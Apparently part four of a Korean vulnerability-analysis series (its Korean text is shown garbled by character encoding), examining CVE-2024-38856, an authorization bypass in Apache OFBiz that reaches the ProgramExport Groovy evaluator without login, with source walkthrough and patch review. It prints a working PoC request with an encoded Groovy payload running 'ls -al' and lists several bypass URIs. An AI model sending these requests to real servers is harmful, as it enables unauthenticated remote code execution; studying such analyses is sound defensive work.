# Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-38856 (4/7)

> ğŸ”– **Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°**
> 1. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: ê°œìš” (1/7)](/Apache%20OFBiz%201-Day%20Analysis/README.md)
> 2. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-32113 (2/7)](/Apache%20OFBiz%201-Day%20Analysis/02.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-32113/README.md)
> 3. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-36104 (3/7)](/Apache%20OFBiz%201-Day%20Analysis/03.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-36104/README.md)
> 4. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-38856 (4/7)](/Apache%20OFBiz%201-Day%20Analysis/04.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-38856/README.md) 
> 5. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45195 (5/7)](/Apache%20OFBiz%201-Day%20Analysis/05.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45195/README.md) 
> 6. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45507 (6/7)](/Apache%20OFBiz%201-Day%20Analysis/06.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45507/README.md) 
> 7. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-47208 (7/7)](/Apache%20OFBiz%201-Day%20Analysis/07.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-47208/README.md) 

# Introduction

ì„¸ ë²ˆì§¸ ì·¨ì•½ì ì¸ `CVE-2024-38856`ì€ ì´ì „ì— ë°œê²¬ëœ `CVE-2024-32113`, `CVE-2024-36104` ì·¨ì•½ì ì˜ ê·¼ë³¸ì ì¸ ì›ì¸ì— ëŒ€í•œ ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ì „ì— ë°œê²¬ëœ `CVE-2024-32113`, `CVE-2024-36104` ì·¨ì•½ì ì€ ê³µê²© ë²¡í„°ê°€ ëœ URIë¥¼ ê¸°ë°˜ìœ¼ë¡œ Path Traversal ì·¨ì•½ì ì„ ë°©ì–´í–ˆì§€ë§Œ, ì‚¬ì‹¤ ê·¼ë³¸ì ì¸ ì·¨ì•½ì  ì›ì¸ì— ëŒ€í•œ í•´ê²°ì±…ì€ ì•„ë‹ˆì—ˆìŠµë‹ˆë‹¤.

ì´ë²ˆ `CVE-2024-38856` ì·¨ì•½ì ì€ NVDì—ì„œë„ ì–¸ê¸‰ë˜ì—ˆë“¯ì´ Incorrect Authorization ì·¨ì•½ì ìœ¼ë¡œ, Apache OFBizì—ì„œ ì¸ì¦ë˜ì§€ ì•Šì€ ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ ê¶Œí•œ ê²€ì‚¬ ì—†ì´ í™”ë©´ ë Œë”ë§ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ë¬¸ì œì…ë‹ˆë‹¤. ê·¸ëŸ¼ ì´ë²ˆ `CVE-2024-38856` ì·¨ì•½ì  ë¶„ì„ì„ í†µí•´ ê·¼ë³¸ì ì¸ ì·¨ì•½ì  ë°œìƒ ì›ì¸ì„ ë¶„ì„í•´ë³´ê² ìŠµë‹ˆë‹¤.

> ğŸ’¿ Apache OFBiz 18.12.14 Download Link
>
> [Apache Download Mirrors - v18.12.14 Download Link](https://www.apache.org/dyn/closer.lua/ofbiz/apache-ofbiz-18.12.14.zip)

</aside>

## Vulnerability Detail

| CVE | CVE-2024-38856 |
| --- | --- |
| Vulnerability | Incorrect Authorization |
| CVSS(3.x) | `CRITICAL` 9.8 |
| Product | Apache OFBiz |
| Version | <= 18.12.14 |
| Link | [`https://nvd.nist.gov/vuln/detail/CVE-2024-38856`](https://nvd.nist.gov/vuln/detail/CVE-2024-38856) |
| Description | Incorrect Authorization vulnerability in Apache OFBiz. This issue affects Apache OFBiz: through 18.12.14. Users are recommended to upgrade to version 18.12.15, which fixes the issue. Unauthenticated endpoints could allow execution of screen rendering code of screens if some preconditions are met (such as when the screen definitions don't explicitly check user's permissions because they rely on the configuration of their endpoints). |

# Analysis

ë¨¼ì €, ì´ì „ì— ë°œìƒí•œ `CVE-2024-32113`ì™€ `CVE-2024-36104` ì·¨ì•½ì ì´ íŒ¨ì¹˜ëœ Apache OFBiz 18.12.14 ë²„ì „ì—ì„œ Path Traversal ê³µê²©ì„ ì–´ë–»ê²Œ ë°©ì–´í•˜ê³  ìˆëŠ”ì§€ ì‚´í´ë³´ê³ , ì´ ë²„ì „ì—ì„œ ë°œìƒí•œ `CVE-2024-38856` ì·¨ì•½ì ì˜ ë°œìƒ ì›ì¸ì„ ë¶„ì„í•´ë³´ê² ìŠµë‹ˆë‹¤.

## 18.12.14 íŒ¨ì¹˜ ê¸°ë¡

Apache OFBiz 18.12.14 ì´ì „ ë²„ì „ì—ì„œ ë°œìƒí•œ Path Traversal ì·¨ì•½ì ì€ ê³µê²© ë²¡í„°ê°€ëœ URIì˜ ìš”ì²­ì„ ë°©ì–´í•˜ê¸° ìœ„í•œ ì½”ë“œ ë¡œì§ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.

> [https://github.com/apache/ofbiz-framework/compare/release18.12.13...release18.12.14](https://github.com/apache/ofbiz-framework/compare/release18.12.13...release18.12.14)
> 

![image](./images/image-001.png)

ì¦‰, `replaceAll` ë©”ì„œë“œë¥¼ ì´ìš©í•˜ì—¬ ì„¸ë¯¸ì½œë¡ (`;`) ë¬¸ìì™€ URL ì¸ì½”ë”©ëœ ì (`%2e`)ì„ ì œê±°í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ Path Traversal ê³µê²©ì„ ë°©ì–´í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê¸°ì¡´ PoCë¥¼ ìˆ˜í–‰í•  ê²½ìš° ì•„ë˜ì™€ ê°™ì´ 500 Internal Server Error ì‘ë‹µê³¼ í•¨ê»˜ ì˜ˆì™¸ê°€ ë°œìƒëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

âœ…Â `CVE-2024-32113`, `CVE-2024-36104` PoC ìš”ì²­ íŒ¨í‚·

```java
POST /webtools/control/main/test/%2E%2E/ProgramExport HTTP/1.1
Host: localhost:8443
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 284

groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u006c\u0073\u0020\u002d\u0061\u006c\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
```

âœ…Â Apache OFBiz 18.12.14 ë²„ì „ì—ì„œÂ `CVE-2024-32113`, `CVE-2024-36104` PoC ìš”ì²­/ì‘ë‹µ ê²°ê³¼

![image](./images/image-002.png)

ê·¸ëŸ¬ë‚˜ ìœ„ íŒ¨ì¹˜ ê¸°ë¡ì€ ë‹¨ìˆœíˆ ê³µê²© ë²¡í„°ê°€ë˜ëŠ” URI ë§Œì„ ë°©ì–´í•˜ëŠ” ë° ì´ˆì ì„ ë§ì¶”ê³  ìˆì„ ë¿, ê·¼ë³¸ì ì¸ ì·¨ì•½ì  ì›ì¸ì¸ ê¶Œí•œ ê²€ì‚¬(Authorization)ì— ëŒ€í•œ í•´ê²°ì±…ì´ ì•„ë‹ˆì—ˆìŠµë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ì—¬ì „íˆ ì¸ì¦ë˜ì§€ ì•Šì€ ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ ë¯¼ê°í•œ í™”ë©´ ë Œë”ë§ ì½”ë“œê°€ ì‹¤í–‰ë  ìˆ˜ ìˆëŠ” ë³´ì•ˆ í—ˆì ì´ ì¡´ì¬í–ˆìŠµë‹ˆë‹¤.

## ê¶Œí•œ ê²€ì‚¬(Authorization)

Apache OFBizì—ì„œëŠ” íŠ¹ì • URL ìš”ì²­ì— ëŒ€í•œ ì»¨íŠ¸ë¡¤ëŸ¬ ì—­í• ì„ ìˆ˜í–‰í•˜ëŠ” `controller.xml` ì—ì„œ ì¸ì¦ ì—¬ë¶€ë¥¼ ì •ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ì´ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ì´ `<security>` ìš”ì†Œì— `auth` ì†ì„± ê°’ì„ `true` ë¡œ ì§€ì •í•˜ì—¬ ì •ì˜í•©ë‹ˆë‹¤.

ğŸ”Â /framework/webtools/webapp/webtools/WEB-INF/controller.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<request-map uri="main">
    <security https="true" auth="false"/>
    <response name="success" type="view" value="main"/>
</request-map>

<!-- Entity Information Requests -->
<request-map uri="entitymaint">
    <security https="true" auth="true"/>
    <response name="success" type="view" value="entitymaint"/>
</request-map>
```

ìœ„ `controller.xml` íŒŒì¼ ë‚´ ì½”ë“œë¥¼ ì‚´í´ë³´ë©´, `main` ì€ `auth="false"` ë¡œ ì„¤ì •ë˜ì–´ ìˆì–´ ì¸ì¦ì„ í•„ìš”ë¡œ í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

![image](./images/image-003.png)

ë°˜ë©´ì—, `entitymaint`ëŠ” `auth="true"`ë¡œ ì„¤ì •ë˜ì–´ ìˆì–´ ì¸ì¦ì´ í•„ìš”í•©ë‹ˆë‹¤. 

![image](./images/image-004.png)

ì¦‰, ìš”ì²­ URI(`requestURI`)ì— ëŒ€í•´ `controller.xml` ì—ì„œ `auth="false"` ë¡œ ì •ì˜ëœ ê²½ìš° ì¸ì¦ ì—†ì´ë„ ì ‘ê·¼ì´ ê°€ëŠ¥í•œ ì—”ë“œí¬ì¸íŠ¸ê°€ ì¡´ì¬í•˜ê²Œ ë©ë‹ˆë‹¤ë§Œ, Apache OFBizëŠ” URI ì²˜ë¦¬ ë©”ì»¤ë‹ˆì¦˜ì—ì„œ íŠ¹ì´ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. (ref. [URI ì²˜ë¦¬ ë©”ì»¤ë‹ˆì¦˜](/Apache%20OFBiz%201-Day%20Analysis/02.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-32113/README.md#URI-ì²˜ë¦¬-ë©”ì»¤ë‹ˆì¦˜) )

ì´ëŠ” ìš”ì²­ URI(`requestURI`)ëŠ” ì¸ì¦ ì²˜ë¦¬ ê³¼ì •ì´ ì¡´ì¬í•˜ì§€ë§Œ, ë·° ë§µ(`overrideViewrUri`)ì€ ì¸ì¦ ì²˜ë¦¬ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•ŠëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ, ì¸ì¦ì´ í•„ìš”í•˜ì§€ ì•Šì€ ë‹¤ë¥¸ ì—”ë“œí¬ì¸íŠ¸ì™€ í•¨ê»˜ `ProgramExport` ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë®ì–´ì”Œìš°ëŠ” URIë¡œ ìš”ì²­í•  ê²½ìš° ì¸ì¦ ì—†ì´ë„ `ProgramExport` ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.

âœ…Â `ProgramExport` ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼ ê°€ëŠ¥í•œ URI 

- `POST` `/webtools/control/main/ProgramExport`
- `POST` `/webtools/control/forgotPassword/ProgramExport`
- `POST` `/webtools/control/showDateTime/ProgramExport`
- `POST` `/webtools/control/view/ProgramExport`
- `POST` `/webtools/control/*TestService*/ProgramExport`

ì´ì–´ì„œ ë°”ë¡œ ìœ„ ë‚´ìš©ì— ëŒ€í•œ ë¶„ì„ì„ ìˆ˜í–‰í•´ë³´ê² ìŠµë‹ˆë‹¤. 

## ê·¼ë³¸ì ì¸ ì›ì¸ ë¶„ì„

ë¨¼ì €, `ProgramExport` ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼ ê°€ëŠ¥í•œ URI ì¤‘ ì•„ë˜ì˜ URIì— ëŒ€í•œ íŒ¨í‚·ì„ ìš”ì²­í•´ ë³´ê² ìŠµë‹ˆë‹¤.

âœ…Â `POST` `/webtools/control/main/ProgramExport`

```xml
POST /webtools/control/main/ProgramExport HTTP/1.1
Host: localhost:8443
Content-Type: application/x-www-form-urlencoded
Content-Length: 284

groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u006c\u0073\u0020\u002d\u0061\u006c\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
```

ìœ„ ìš”ì²­ì— ëŒ€í•´ì„œ `ControlFilter.java` ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì´ ê³µê²© ë²¡í„°ê°€ ë‹´ê¸´ URI íŒ¨í„´ ê²€ì‚¬ì— í•´ë‹¹ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ URIì— ëŒ€í•œ ê²€ì¦ì„ í†µê³¼í•˜ê²Œ ë©ë‹ˆë‹¤. 

![image](./images/image-005.png)

ì´í›„ ë¡œì§ì€ `RequestHandler.java` ì—ì„œ `path`, `requestUri`, `overrideViewUri` ë³€ìˆ˜ ì´ˆê¸°í™” ê³¼ì •ì„ ìˆ˜í–‰í•˜ë©°, ê°ê°ì˜ ë³€ìˆ˜ì˜ ê°’ì€ ë‹¤ìŒì˜ ê°’ë“¤ì´ ì´ˆê¸°í™”ë©ë‹ˆë‹¤.

- `path` /main/ProgramExport
- `requestUri` main
- `overrideViewUri` ProgramExport

![image](./images/image-006.png)

ì´í›„ ì¸ì¦ ê²€ì‚¬ëŠ” `requestUri` ê°’(`main`)ì— ëŒ€í•´ì„œë§Œ ì¸ì¦ì„ ìˆ˜í–‰ í•˜ë¯€ë¡œ ì•„ë˜ì™€ ê°™ì´ ì¸ì¦ ê²€ì‚¬ì—ì„œ í†µê³¼í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](./images/image-007.png)

ì´í›„ ë·°ë¥¼ ë Œë”ë§í•˜ê¸° ìœ„í•œ `renderView` ë©”ì„œë“œì˜ ì¸ìë¡œ `overrideViewUri` ë³€ìˆ˜ì˜ ê°’ì¸ `ProgramExport` ê°€ ì„¤ì •ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](./images/image-008.png)

`ProgramExport` ë·°ëŠ” ë‹¤ìŒê³¼ ê°™ì´ `EntityScreens.xml#ProgramExport` ì»´í¬ë„ŒíŠ¸ë¥¼ ìŠ¤í¬ë¦° ìœ„ì ¯ìœ¼ë¡œ ì •ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/webapp/webtools/WEB-INF/controller.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<view-map name="ProgramExport" type="screen" page="component://webtools/widget/EntityScreens.xml#ProgramExport"/>
```

ê·¸ ë‹¤ìŒ `EntityScreens.xml` ì—ì„œëŠ” ë·°ê°€ ë Œë”ë§ë  ë•Œ `ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/widget/EntityScreens.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<screen name="ProgramExport">
    <section>
        <actions>
            <set field="titleProperty" value="PageTitleEntityExportAll"/>
            <set field="tabButtonItem" value="programExport"/>
            <script location="component://webtools/groovyScripts/entity/ProgramExport.groovy"/>
        </actions>
        <widgets>
            <decorator-screen name="CommonImportExportDecorator" location="${parameters.mainDecoratorLocation}">
                <decorator-section name="body">
                     <screenlet>
                        <include-form name="ProgramExport" location="component://webtools/widget/MiscForms.xml"/>
                    </screenlet>
                    <screenlet>
                        <platform-specific>
                            <html><html-template location="component://webtools/template/entity/ProgramExport.ftl"/></html>
                        </platform-specific>
                    </screenlet>
                </decorator-section>
            </decorator-screen>
        </widgets>
    </section>
</screen>
```

`ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œëŠ” `groovyProgram` íŒŒë¼ë¯¸í„°ë¥¼ ê°€ì ¸ì™€ í•´ë‹¹ ê°’ì„ ê·¸ë£¨ë¹„ ìŠ¤í¬ë¦½íŠ¸ë¡œ ì‹¤í–‰(`shell.evaluate(groovyProgram)`)í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/groovyScripts/entity/ProgramExport.groovy íŒŒì¼ ë‚´ ì¼ë¶€

```groovy
// ì¤‘ëµ

if (!parameters.groovyProgram) {
    groovyProgram = '''
		// ì¤‘ëµ
'''
    parameters.groovyProgram = groovyProgram
} else {
    groovyProgram = parameters.groovyProgram
}

// Add imports for script.
def importCustomizer = new ImportCustomizer()
importCustomizer.addImport("org.apache.ofbiz.entity.GenericValue")
importCustomizer.addImport("org.apache.ofbiz.entity.model.ModelEntity")
def configuration = new CompilerConfiguration()
configuration.addCompilationCustomizers(importCustomizer)

Binding binding = new Binding()
binding.setVariable("delegator", delegator)
binding.setVariable("recordValues", recordValues)

ClassLoader loader = Thread.currentThread().getContextClassLoader()
def shell = new GroovyShell(loader, binding, configuration)

if (UtilValidate.isNotEmpty(groovyProgram)) {
    try {
        // Check if a webshell is not uploaded but allow "import"
        if (!SecuredUpload.isValidText(groovyProgram, ["import"])) {
            logError("================== Not executed for security reason ==================")
            request.setAttribute("_ERROR_MESSAGE_", "Not executed for security reason")
            return
        }
        shell.parse(groovyProgram)
        shell.evaluate(groovyProgram)
        recordValues = shell.getVariable("recordValues")
        xmlDoc = GenericValue.makeXmlDocument(recordValues)
        context.put("xmlDoc", xmlDoc)
    } catch(MultipleCompilationErrorsException e) {
```

ì¦‰, `/webtools/control/main/ProgramExport` ë¡œ ìš”ì²­ ì‹œ `requestUri` ì˜ ê°’(`main`)ì— ëŒ€í•´ì„œë§Œ ì¸ì¦ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ê³  ì´í›„ `ProgramExport` ëŠ” ë Œë”ë§ ë˜ì–´ ìµœì¢…ì ìœ¼ë¡œ `ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ë©° ì´ë•Œ, `groovyProgram` íŒŒë¼ë¯¸í„°ê°€ ì¡´ì¬í•  ê²½ìš° í•´ë‹¹ ê°’ì´ ê·¸ë£¨ë¹„ ìŠ¤í¬ë¦½íŠ¸ë¡œ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì— ëŒ€í•œ ì „ì²´ì ì¸ íë¦„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

âœ…Â `/webtools/control/main/ProgramExport` ìš”ì²­ì— ëŒ€í•œ íë¦„

```
ì‚¬ìš©ì ìš”ì²­ (URL: /webtools/control/main/ProgramExport)
       â”‚
       â–¼
Controller ì²˜ë¦¬ (ControlFilter.java)
       â”œâ”€â”€ URL íŒ¨í„´ ê²€ì‚¬(Path Traversal ê³µê²© ë²¡í„° í•„í„°ë§)
       â–¼
RequestHandlerì—ì„œ ë³€ìˆ˜ ì´ˆê¸°í™” (RequestHandler.java)
       â”œâ”€â”€ `path` ì´ˆê¸°í™” (`/main/ProgramExport`)
       â”œâ”€â”€ `requestUri` ì´ˆê¸°í™” (`main`)
       â”œâ”€â”€ `overrideViewUri` ì´ˆê¸°í™” (`ProgramExport`)
       â–¼
ì¸ì¦ ê²€ì‚¬ (requestUri ê¸°ì¤€ ì¸ì¦ ìˆ˜í–‰ â†’ `ProgramExport` ì¸ì¦ ìš°íšŒ)
       â”‚
       â–¼
ë·° ë Œë”ë§ (renderView ë©”ì„œë“œ í˜¸ì¶œ)
       â”œâ”€â”€ `ProgramExport` ë·° ë§¤í•‘ (controller.xml)
       â”œâ”€â”€ `EntityScreens.xml`ì—ì„œ `ProgramExport` ë·° ì»´í¬ë„ŒíŠ¸ ë¡œë“œ
       â–¼
ê·¸ë£¨ë¹„ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ (ProgramExport.groovy)
       â”œâ”€â”€ `groovyProgram` íŒŒë¼ë¯¸í„° ê°’ í™•ì¸
       â”œâ”€â”€ `shell.evaluate(groovyProgram)` ì‹¤í–‰
       â–¼
ì‚¬ìš©ì í™”ë©´ ì¶œë ¥
```

# PoC

ê²°ê³¼ì ìœ¼ë¡œ, ë‹¤ìŒì˜ ìš”ì²­ íŒ¨í‚·ì´ ì „ë‹¬ë  ê²½ìš° `groovyProgram` íŒŒë¼ë¯¸í„°ì— ë‹´ê¸´ ì„ì˜ ëª…ë ¹ì–´(`ls -al`)ê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> `grovyProgram=throw new Exception('ls -al'.execute().text);` ìš”ì²­
> 

```
POST /webtools/control/main/ProgramExport HTTP/1.1
Host: localhost:8443
Content-Type: application/x-www-form-urlencoded
Content-Length: 284

groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u006c\u0073\u0020\u002d\u0061\u006c\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
```

![image](./images/image-009.png)

# Patch

ì´ë²ˆ `CVE-2024-38856` ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ ë²„ì „ì¸ Apache OFBiz ë²„ì „ 18.12.15 ì—ì„œëŠ” `ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ì‹œ ì‚¬ìš©ì ì¸ì¦ ì—¬ë¶€ë¥¼ ê²€ì‚¬í•˜ëŠ” ë¡œì§ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.

> [https://github.com/apache/ofbiz-framework/compare/release18.12.14...release18.12.15](https://github.com/apache/ofbiz-framework/compare/release18.12.14...release18.12.15)
> 

![image](./images/image-010.png)

ë”°ë¼ì„œ, `CVE-2024-38856` ì·¨ì•½ì  PoCë¥¼ ìˆ˜í–‰í•  ê²½ìš° ë‹¤ìŒê³¼ ê°™ì´ ì—ëŸ¬ ë©”ì‹œì§€ê°€ ë°œìƒë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](./images/image-011.png)

ë˜í•œ, ë¡œê·¸ì—ì„œë„ ê¶Œí•œ ê²€ì‚¬ `security.hasPermission` ë©”ì„œë“œë¡œë¶€í„° ì˜ˆì™¸ê°€ ë°œìƒë˜ì–´ ìŠ¤í¬ë¦½íŠ¸ê°€ ì¢…ë£Œëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](./images/image-012.png)

# Continueâ€¦

ë‹¤ìŒì€ ë„¤ ë²ˆì§¸ CVE ì·¨ì•½ì ì¸ [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45195 (5/7)](/Apache%20OFBiz%201-Day%20Analysis/05.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45195/README.md) ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤.

> ğŸ”– **Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°**
> 1. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: ê°œìš” (1/7)](/Apache%20OFBiz%201-Day%20Analysis/README.md)
> 2. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-32113 (2/7)](/Apache%20OFBiz%201-Day%20Analysis/02.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-32113/README.md)
> 3. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-36104 (3/7)](/Apache%20OFBiz%201-Day%20Analysis/03.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-36104/README.md)
> 4. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-38856 (4/7)](/Apache%20OFBiz%201-Day%20Analysis/04.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-38856/README.md) 
> 5. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45195 (5/7)](/Apache%20OFBiz%201-Day%20Analysis/05.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45195/README.md) 
> 6. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45507 (6/7)](/Apache%20OFBiz%201-Day%20Analysis/06.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45507/README.md) 
> 7. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-47208 (7/7)](/Apache%20OFBiz%201-Day%20Analysis/07.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-47208/README.md) 

---

# References

- https://issues.apache.org/jira/browse/OFBIZ-13128
- https://www.sonicwall.com/blog/sonicwall-discovers-second-critical-apache-ofbiz-zero-day-vulnerability